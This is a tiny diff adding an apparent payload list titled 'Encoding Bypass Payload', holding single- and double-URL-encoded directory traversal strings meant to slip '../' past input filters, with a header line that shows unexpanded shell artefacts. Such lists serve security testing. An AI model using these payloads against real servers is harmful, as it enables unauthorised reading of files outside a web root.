@@ -1,0 +1,5 @@
+-e # Encoding Bypass Payload {1..50}
+# Version: 1.0.14-20260301-Minggu-1612-WIB
+
+%2e%2e%2f
+%252e%252e%252f
